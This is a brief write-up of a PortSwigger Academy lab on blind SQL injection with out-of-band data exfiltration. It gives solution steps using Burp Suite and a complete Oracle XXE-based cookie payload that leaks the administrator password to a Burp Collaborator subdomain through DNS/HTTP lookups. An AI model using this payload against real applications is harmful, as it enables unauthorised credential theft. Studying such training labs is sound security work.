# Lab: Blind SQL injection with out-of-band data exfiltration

**Official lab:** [Lab: Blind SQL injection with out-of-band data exfiltration](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration)

## Lab idea

Practices the out-of-band SQLi concept in a scenario where database information can be conveyed through an external interaction, rather than returned in the page.

## Vulnerability in brief
SQL injection (SQLi) is a web vulnerability in which untrusted input changes the meaning of a SQL query made by an application. It commonly occurs when an application builds a query by concatenating user-controlled values into SQL instead of keeping query structure separate from data. Inputs may arrive through form fields, URL parameters, cookies, headers, or other request data. Injection can occur in different query types and positions, not only in a `SELECT` statement's `WHERE` clause.

## Solution idea
1. Visit the front page of the shop, and use Burp Suite Professional to intercept and modify the request containing the TrackingId cookie.
2. Modify the TrackingId cookie, changing it to a payload that will leak the administrator's password in an interaction with the Collaborator server.
3. Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated in the modified TrackingId cookie.
4. Go to the Collaborator tab, and click "Poll now".
5. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.
6. In the browser, click "My account" to open the login page.

## Payloads / key values
- `TrackingId`
- `TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--`
- `administrator`

## Official source
- [PortSwigger Academy: Lab: Blind SQL injection with out-of-band data exfiltration](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration)
